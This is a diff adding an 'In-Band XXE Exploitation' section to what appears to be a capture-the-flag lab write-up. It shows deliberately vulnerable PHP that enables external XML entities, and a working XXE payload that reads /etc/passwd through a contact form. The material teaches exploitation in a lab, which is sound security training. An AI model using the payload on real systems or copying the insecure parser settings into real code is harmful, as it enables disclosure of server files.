@@ -50,6 +50,41 @@ Finished
 Out-of-band XXE, on the other hand, refers to an XXE vulnerability where the attacker cannot see the response from the server. This requires using alternative channels, such as DNS or HTTP requests, to exfiltrate data. To extract the data, the attacker must craft a malicious XML payload that will trigger an out-of-band request, such as a DNS query or an HTTP request.</p>
 
 <h3>In-Band XXE Exploitation</h3>
+<p>We will be using Burp for this room. To demonstrate this vulnerability, go to http://10.10.18.162/contact.php, and fill out the form.</p>
+
+![image](https://github.com/user-attachments/assets/0c8415df-d059-4346-956a-d07afbb133e9)
+
+<p>Click the submit button and intercept the request.</p>
+
+![image](https://github.com/user-attachments/assets/99f73232-bac6-4b34-a0b4-a037c3536a5d)
+
+<p>The submitted data is processed by contact_submit.php, which contains a vulnerable PHP code designed to return the value of the name parameter when a user submits a message in the form. Below is the vulnerable code:</p>
+
+<pre><code>libxml_disable_entity_loader(false);
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $xmlData = file_get_contents('php://input');
+
+    $doc = new DOMDocument();
+    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 
+
+    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;
+
+    echo "Thank you, " .$expandedContent . "! Your message has been received.";
+}
+</code></pre>
+
+<p>Since the application returns the value of the name parameter, we can inject an entity that is pointing to /etc/passwd to disclose its values.</p>
+
+<pre><code><!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<contact>
+<name>&xxe;</name>
+<email>test@test.com</email>
+<message>test</message>
+</contact>
+</code></pre>
 
 ![image](https://github.com/user-attachments/assets/53e2b635-6567-43c9-b046-819959d5d8b2)
 
